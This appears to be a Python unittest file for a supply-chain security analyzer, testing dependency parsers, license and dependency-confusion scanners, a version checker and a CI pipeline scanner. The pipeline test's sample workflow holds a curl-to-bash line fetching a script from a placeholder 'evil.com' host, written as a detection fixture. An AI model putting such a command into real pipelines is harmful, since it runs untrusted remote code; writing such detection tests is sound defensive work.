import unittest
import tempfile
import os
from xml.etree import ElementTree as ET
from unittest.mock import patch
from analyzer.main import main

from analyzer.parsers.ruby_parser import RubyParser
from analyzer.parsers.maven_parser import MavenParser
from analyzer.scanners.license import LicenseScanner
from analyzer.scanners.dep_confusion import DependencyConfusionScanner
from analyzer.scanners.pipeline import PipelineScanner
from analyzer.scanners.version_analyzer import VersionAnalyzer
from analyzer.graph.dependency_graph import DependencyGraph

class TestExtendedParsers(unittest.TestCase):
    def test_ruby_parser(self):
        # Create a temporary Gemfile
        with tempfile.NamedTemporaryFile(suffix="Gemfile", delete=False, mode="w", encoding="utf-8") as f:
            f.write("# Sample Gemfile\n")
            f.write("source 'https://rubygems.org'\n")
            f.write("gem 'rails', '7.1.3'\n")
            f.write("gem 'puma', '~> 6.0'\n")
            f.write("gem 'sqlite3'\n")
            gemfile_path = f.name

        try:
            parser = RubyParser(gemfile_path)
            deps = parser.parse()
            
            # Verify gems extracted
            self.assertEqual(len(deps), 3)
            names = [d["name"] for d in deps]
            self.assertIn("rails", names)
            self.assertIn("puma", names)
            self.assertIn("sqlite3", names)
            
            # Verify version constraint parsed
            rails_dep = next(d for d in deps if d["name"] == "rails")
            self.assertEqual(rails_dep["version"], "7.1.3")
            
            sqlite_dep = next(d for d in deps if d["name"] == "sqlite3")
            self.assertEqual(sqlite_dep["version"], "latest")
        finally:
            os.remove(gemfile_path)

    def test_maven_parser(self):
        # Create a temporary pom.xml with standard maven namespace
        pom_content = """<?xml version="1.0" encoding="UTF-8"?>
        <project xmlns="http://maven.apache.org/POM/4.0.0"
                 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                 xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
            <modelVersion>4.0.0</modelVersion>
            <groupId>com.mycompany.app</groupId>
            <artifactId>my-app</artifactId>
            <version>1.0.0</version>
            <properties>
                <spring.version>6.1.8</spring.version>
            </properties>
            <dependencies>
                <dependency>
                    <groupId>org.springframework</groupId>
                    <artifactId>spring-core</artifactId>
                    <version>${spring.version}</version>
                </dependency>
                <dependency>
                    <groupId>junit</groupId>
                    <artifactId>junit</artifactId>
                    <version>4.13.2</version>
                    <scope>test</scope>
                </dependency>
            </dependencies>
        </project>
        """
        with tempfile.NamedTemporaryFile(suffix="pom.xml", delete=False, mode="w", encoding="utf-8") as f:
            f.write(pom_content)
            pom_path = f.name

        try:
            parser = MavenParser(pom_path)
            deps = parser.parse()

            # Verify groupId:artifactId names
            self.assertEqual(len(deps), 2)
            names = [d["name"] for d in deps]
            self.assertIn("org.springframework:spring-core", names)
            self.assertIn("junit:junit", names)

            # Verify property version resolution
            spring_dep = next(d for d in deps if d["name"] == "org.springframework:spring-core")
            self.assertEqual(spring_dep["version"], "6.1.8")
            self.assertFalse(spring_dep["is_dev"])

            # Verify test scope and dev flag
            junit_dep = next(d for d in deps if d["name"] == "junit:junit")
            self.assertEqual(junit_dep["version"], "4.13.2")
            self.assertTrue(junit_dep["is_dev"])
        finally:
            os.remove(pom_path)


class TestExtendedScanners(unittest.TestCase):
    def test_license_scanner(self):
        scanner = LicenseScanner(use_cache=False)
        
        # Test risk classification
        risk_gpl, _ = scanner.classify_risk("GPLv3")
        self.assertEqual(risk_gpl, "HIGH")

        risk_mit, _ = scanner.classify_risk("MIT")
        self.assertEqual(risk_mit, "LOW")

        risk_prop, _ = scanner.classify_risk("Proprietary Commercial")
        self.assertEqual(risk_prop, "MEDIUM")

        # Test scan alerts and conflict detection
        deps = [
            {"name": "requests", "version": "2.25.1", "ecosystem": "python"},
            {"name": "junit:junit", "version": "4.13.2", "ecosystem": "maven"} # EPL-2.0 -> Copyleft
        ]
        alerts, info = scanner.scan(deps)
        
        # Should detect EPL as high-risk copyleft
        self.assertTrue(any(a["type"] == "LICENSE_RISK" for a in alerts))
        self.assertIn("requests", info)
        self.assertIn("junit:junit", info)

        # Test license conflict: high-risk copyleft (GPL) + proprietary
        conflict_deps = [
            {"name": "gpl-pkg", "license": "GPL-3.0"},
            {"name": "prop-pkg", "license": "Proprietary Commercial"}
        ]
        # Simulate scan output directly
        conflict_alerts = []
        licenses_found = {
            "gpl-pkg": {"license": "GPL-3.0", "risk": "HIGH"},
            "prop-pkg": {"license": "Proprietary Commercial", "risk": "MEDIUM"}
        }
        has_copyleft = any(info["risk"] == "HIGH" for info in licenses_found.values())
        has_proprietary = any("commercial" in info["license"].lower() or "proprietary" in info["license"].lower() for info in licenses_found.values())
        self.assertTrue(has_copyleft and has_proprietary)

    def test_dep_confusion_scanner(self):
        scanner = DependencyConfusionScanner(use_cache=False)
        
        # Create a temp directory with pip.conf using extra-index-url
        temp_dir = tempfile.mkdtemp()
        pip_conf_path = os.path.join(temp_dir, 'pip.conf')
        with open(pip_conf_path, 'w', encoding='utf-8') as f:
            f.write("[global]\nindex-url = https://mycompany.com/simple\nextra-index-url = https://pypi.org/simple\n")

        try:
            findings = scanner.scan_configs(temp_dir)
            self.assertTrue(any(f["type"] == "DEP_CONFUSION_CONFIG" for f in findings))
            self.assertTrue(any("extra-index-url" in f["message"] for f in findings))
        finally:
            os.remove(pip_conf_path)
            os.rmdir(temp_dir)

    def test_pipeline_scanner(self):
        scanner = PipelineScanner()
        
        # Test pipeline file scanning
        pipeline_content = """
        name: CI
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@master # Unpinned version
              - name: Run script
                run: curl -s https://evil.com/setup.sh | bash # curl | bash execution
              - name: Setup Token
                env:
                  MY_TOKEN: "secret_value_12345" # Hardcoded token value
                run: echo "Configured"
        """
        with tempfile.NamedTemporaryFile(suffix=".yml", delete=False, mode="w", encoding="utf-8") as f:
            f.write(pipeline_content)
            pipeline_path = f.name

        try:
            alerts = scanner.scan_file(pipeline_path)
            # Should catch UNPINNED_ACTION, CURL_BASH, and HARDCODED_ENV_TOKEN
            self.assertTrue(len(alerts) >= 3)
            pattern_names = [a["pattern_name"] for a in alerts]
            self.assertIn("UNPINNED_ACTION", pattern_names)
            self.assertIn("CURL_BASH", pattern_names)
            self.assertIn("HARDCODED_ENV_TOKEN", pattern_names)
        finally:
            os.remove(pipeline_path)

    def test_version_analyzer(self):
        analyzer = VersionAnalyzer(use_cache=False)
        
        # Verify cleaning
        self.assertEqual(analyzer.clean_version("==2.32.3"), "2.32.3")
        self.assertEqual(analyzer.clean_version("^1.14.0"), "1.14.0")
        self.assertEqual(analyzer.clean_version("~> 6.1.4"), "6.1.4")
        self.assertEqual(analyzer.clean_version("latest"), "0.0.0")

        # Mock scanner compare
        dependencies = [
            {"name": "django", "version": "3.2.0"} # Mock db has 5.0.6 -> should flag outdated
        ]
        alerts = analyzer.scan(dependencies, ecosystem="python")
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0]["type"], "OUTDATED_PACKAGE")
        self.assertEqual(alerts[0]["installed_version"], "3.2.0")
        # Can be mock database value "5.0.6" or actual PyPI value e.g. "6.0.6"
        latest_ver = alerts[0]["latest_version"]
        self.assertTrue(latest_ver[0].isdigit(), f"Expected a valid version string, got: {latest_ver}")


class TestDependencyGraphBlastRadius(unittest.TestCase):
    def test_find_path_to_transitive_dependency(self):
        graph = DependencyGraph(project_name="project")
        
        # Setup graph: roots (flask), flask -> jinja2 -> markupsafe
        graph._add_node("flask", is_direct=True, version="3.0.0")
        graph._add_node("jinja2", is_direct=False, version="3.1.2")
        graph._add_node("markupsafe", is_direct=False, version="2.1.1")
        
        graph.add_edge("flask", "jinja2")
        graph.add_edge("jinja2", "markupsafe")

        # Find path to transitive
        path = graph.find_path_to("markupsafe")
        self.assertEqual(path, ["flask", "jinja2", "markupsafe"])

        # Find path to direct
        path_direct = graph.find_path_to("flask")
        self.assertEqual(path_direct, ["flask"])

        # Unconnected package returns empty
        path_missing = graph.find_path_to("non-existent")
        self.assertEqual(path_missing, [])


class TestCLIArguments(unittest.TestCase):
    def setUp(self):
        self.mock_report_data = {
            "metadata": {"security_score": 100, "version": "1.1.0", "generated_at": "2026-07-07T21:30:00Z"},
            "summary": {
                "total_dependencies": 0,
                "vulnerabilities_found": 0,
                "typosquatting_alerts": 0,
                "secrets_found": 0,
                "licenses_found": 0,
                "dep_confusion_issues": 0,
                "pipeline_issues": 0,
                "versions_outdated": 0,
                "severity_breakdown": {
                    "CRITICAL": 0,
                    "HIGH": 0,
                    "MEDIUM": 0,
                    "LOW": 0
                }
            },
            "dependencies": [],
            "vulnerabilities": [],
            "typosquatting": [],
            "secrets": [],
            "license": [],
            "dep_confusion": [],
            "pipeline": [],
            "version_analysis": [],
            "recommendations": []
        }

    @patch('sys.argv', ['scan-deps', '-f', 'data/example_requirements.txt', '--no-cicd'])
    @patch('analyzer.main.PipelineScanner')
    @patch('analyzer.main.ConsoleReporter')
    @patch('analyzer.main.JsonReporter')
    @patch('analyzer.main.PythonParser')
    def test_no_cicd_skips_pipeline_scanner(self, mock_parser, mock_json_reporter, mock_console_reporter, mock_pipeline_scanner):
        mock_parser.return_value.parse.return_value = []
        mock_json_reporter.return_value.report_data = self.mock_report_data
        mock_json_reporter.return_value.get_json_dict.return_value = self.mock_report_data
        main()
        # Verify PipelineScanner was NOT instantiated
        mock_pipeline_scanner.assert_not_called()

    @patch('sys.argv', ['scan-deps', '-f', 'data/example_requirements.txt'])
    @patch('analyzer.main.PipelineScanner')
    @patch('analyzer.main.ConsoleReporter')
    @patch('analyzer.main.JsonReporter')
    @patch('analyzer.main.PythonParser')
    def test_cicd_runs_by_default(self, mock_parser, mock_json_reporter, mock_console_reporter, mock_pipeline_scanner):
        mock_parser.return_value.parse.return_value = []
        mock_json_reporter.return_value.report_data = self.mock_report_data
        mock_json_reporter.return_value.get_json_dict.return_value = self.mock_report_data
        main()
        # Verify PipelineScanner was instantiated
        mock_pipeline_scanner.assert_called_once()
